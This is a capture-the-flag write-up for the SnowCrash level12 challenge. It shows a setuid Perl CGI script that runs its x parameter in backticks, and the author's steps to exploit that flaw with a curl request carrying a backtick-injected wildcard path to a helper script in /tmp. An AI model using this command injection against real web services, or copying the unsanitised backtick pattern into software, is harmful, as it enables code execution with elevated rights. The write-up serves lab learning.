# Level12

## Research

```bash
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
level12@SnowCrash:~$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```


level12.l uses CGI on localhost:4646, it seems to take 2 arguments. Argument x will be put in uppercase and will be executed thanks to the \`\` quotes. Argument y seems to be useless for our purpose.

We saw in a previous level that we can pass parameters to CGI. So let's try to pass getflag.

Problem: if we pass just getflag, the regex will turn it into GETFLAG and the command won't be run properly. We need to find a way of passing a command without it being transformed in uppercase. Maybe we can run a script instead of a command. 
Using wildcards will prevent the regex to turn /tmp/ into /TMP/ wich doesn't exist.

```
echo "getflag" > /tmp/GETFLAG
touch /tmp/CC
chmod 777 /tmp/GETFLAG
```
```
curl localhost:4646/?x="`/*/GETFLAG>/*/CC`"
```

This does not work, it launch getflag without the appropriate rights...

1h30 later with lot of different useless tries...
It was not the good quotes, and weird to do it like this, it is cleaner to do the > part into the script.
https://stackoverflow.com/questions/6697753/difference-between-single-and-double-quotes-in-bash
https://www.howtogeek.com/howto/29980/whats-the-difference-between-single-and-double-quotes-in-the-bash-shell/

#@ Solution

```
cat /tmp/GETFLAG
#!/bin/bash
getflag > /tmp/flag

touch /tmp/flag
chmod 777 /tmp/GETFLAG

curl localhost:4646?x='`/*/GETFLAG`' 
```
Gives us the flag.
